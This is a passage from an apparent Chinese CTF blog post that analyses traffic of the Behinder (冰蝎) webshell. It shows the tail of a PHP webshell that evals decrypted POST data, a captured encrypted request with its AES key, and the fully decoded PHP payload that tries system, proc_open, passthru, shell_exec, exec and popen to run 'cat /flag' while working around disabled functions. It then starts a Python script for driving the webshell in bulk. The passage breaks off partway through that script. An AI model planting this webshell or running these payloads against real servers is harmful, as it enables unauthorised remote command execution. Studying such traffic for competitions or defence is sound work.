punctuation">;</span>    <span class="token variable">$params</span><span class="token operator">=</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">.</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>    @<span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><h3 id="冰蝎流量分析"><a href="#冰蝎流量分析" class="headerlink" title="冰蝎流量分析"></a>冰蝎流量分析</h3><p>冰蝎客户端连上之后先请求两次pass，用第二次的key，使用命令执行发送的数据包(捕获的key：8be307f657489a41)</p><pre><code>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</code></pre><p>回显</p><pre><code>i90ywWzkOhPc1RGlN8Bx8vAZYbAQbAy440de1SoVNPbL80X28IR4Yxaz6S4oBzBNZUkBP9UX4R1a0m0vazZHpA==</code></pre><p>加密的post数据 会经过</p><pre><code>$post=openssl_decrypt($post, &quot;AES128&quot;, $key);</code></pre><p>用key解密成这种格式的流量</p><pre><code>assert|eval(base64_decode(&#39;xxxx....&#39;));</code></pre><p>base64解密之后</p><pre class=" language-php"><code class="language-php">@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">getSafeStr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$s1</span> <span class="token operator">=</span> <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span>'gbk<span class="token comment" spellcheck="true">//IGNORE',$str);</span>    <span class="token variable">$s0</span> <span class="token operator">=</span> <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">,</span>'utf<span class="token number">-8</span><span class="token comment" spellcheck="true">//IGNORE',$s1);</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s0</span> <span class="token operator">==</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$s0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">,</span>'utf<span class="token number">-8</span><span class="token comment" spellcheck="true">//IGNORE',$str);</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'max_execution_time'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$PadtJn</span> <span class="token operator">=</span> @<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">'disable_functions'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$PadtJn</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$PadtJn</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[, ]+/'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">,</span> <span class="token variable">$PadtJn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$PadtJn</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token variable">$PadtJn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$PadtJn</span> <span class="token operator">=</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string">'trim'</span><span class="token punctuation">,</span> <span class="token variable">$PadtJn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$PadtJn</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FALSE</span> <span class="token operator">!==</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token constant">PHP_OS</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'win'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$c</span> <span class="token punctuation">.</span> <span class="token string">" 2>&amp;1\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$JueQDBH</span> <span class="token operator">=</span> <span class="token string">'is_callable'</span><span class="token punctuation">;</span>    <span class="token variable">$Bvce</span> <span class="token operator">=</span> <span class="token string">'in_array'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$JueQDBH</span><span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token operator">!</span> <span class="token variable">$Bvce</span><span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token variable">$PadtJn</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$kWJW</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$JueQDBH</span><span class="token punctuation">(</span><span class="token string">'proc_open'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token operator">!</span> <span class="token variable">$Bvce</span><span class="token punctuation">(</span><span class="token string">'proc_open'</span><span class="token punctuation">,</span> <span class="token variable">$PadtJn</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token keyword">array</span><span class="token punctuation">(</span>                <span class="token string">'pipe'</span><span class="token punctuation">,</span>                <span class="token string">'r'</span>            <span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span>                <span class="token string">'pipe'</span><span class="token punctuation">,</span>                <span class="token string">'w'</span>            <span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span>                <span class="token string">'pipe'</span><span class="token punctuation">,</span>                <span class="token string">'w'</span>            <span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$kWJW</span> <span class="token operator">=</span> <span class="token keyword">NULL</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$kWJW</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        @<span class="token function">proc_close</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$JueQDBH</span><span class="token punctuation">(</span><span class="token string">'passthru'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token operator">!</span> <span class="token variable">$Bvce</span><span class="token punctuation">(</span><span class="token string">'passthru'</span><span class="token punctuation">,</span> <span class="token variable">$PadtJn</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">passthru</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$kWJW</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$JueQDBH</span><span class="token punctuation">(</span><span class="token string">'shell_exec'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token operator">!</span> <span class="token variable">$Bvce</span><span class="token punctuation">(</span><span class="token string">'shell_exec'</span><span class="token punctuation">,</span> <span class="token variable">$PadtJn</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$kWJW</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$JueQDBH</span><span class="token punctuation">(</span><span class="token string">'exec'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token operator">!</span> <span class="token variable">$Bvce</span><span class="token punctuation">(</span><span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token variable">$PadtJn</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$kWJW</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$kWJW</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$kWJW</span> <span class="token operator">=</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$kWJW</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$JueQDBH</span><span class="token punctuation">(</span><span class="token string">'exec'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token operator">!</span> <span class="token variable">$Bvce</span><span class="token punctuation">(</span><span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token variable">$PadtJn</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$kWJW</span> <span class="token operator">=</span> <span class="token keyword">NULL</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_resource</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$kWJW</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        @<span class="token function">pclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$kWJW</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string">"status"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">"fail"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string">"msg"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">"none of proc_open/passthru/shell_exec/exec/exec is available"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'k'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string">"status"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string">"msg"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">getSafeStr</span><span class="token punctuation">(</span><span class="token variable">$kWJW</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'k'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string">'openssl'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$key</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                 <span class="token punctuation">}</span>            <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">openssl_encrypt</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">"AES128"</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token string">"cat /flag"</span><span class="token punctuation">;</span><span class="token function">main</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="批量脚本"><a href="#批量脚本" class="headerlink" title="批量脚本"></a>批量脚本</h3><p>参考网上的脚本，用python实现了aes，代替了php -r openssl</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> codecs<span class="token keyword">import</span> requests<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token comment" spellcheck="true"># import os</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">padding_zero</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> bytes<span class="token punctuation">:</span>    output <span class="token operator">=</span> list<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    <span class="token keyword">while</span> len<span class="token punctuation">(</span>output<span class="token punctuation">)</span> <span 